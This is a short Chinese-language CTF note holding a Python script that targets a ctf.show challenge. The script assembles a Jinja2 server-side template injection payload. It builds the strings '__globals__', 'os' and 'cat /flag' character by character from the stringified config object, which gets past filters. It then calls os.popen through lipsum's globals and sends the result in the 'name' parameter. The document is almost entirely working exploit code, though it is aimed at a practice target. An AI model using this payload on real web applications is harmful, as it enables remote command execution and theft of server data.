---
创建: 2025-09-10
tags:
  - CTF/脚本/jinja2从内置变量构造字符
---
```python
import requests

url = "http://6f162a2c-9c32-4685-bf19-8d62231004ed.challenge.ctf.show/"

config = [] # 内容是我们之前用 (config|string|list) 得到的列表
config = [ch.lower() for ch in config]

a = "__globals__"
b = "os"
c = "cat /flag"

def create_index(chars: str) -> list:
    res = []
    for char in chars:
        if char in config:
            res.append(config.index(char))
        else:
            print(f'未找到字符:{char}')
            exit(0)
    return res
_a = create_index(a)
_b = create_index(b)
_c = create_index(c)

# print(_a) # print(_b) # print(_c)

def create_payload(arr: list) -> str:
    res = ''
    for i,item in enumerate(arr):
        res += f'(config|string|list).pop({item}).lower()'
        if i < len(arr) - 1:
            res += '~'
    return res
__a = create_payload(_a)
__b = create_payload(_b)
__c = create_payload(_c)

# print(__a) # print(__b) # print(__c)

payload =  f"{{%print((lipsum|attr({__a})).get({__b}).popen({__c}).read())%}}"
# print(payload)

res = requests.get(
    url,
    params={
        "name": payload
    },
)
print(res.text)
```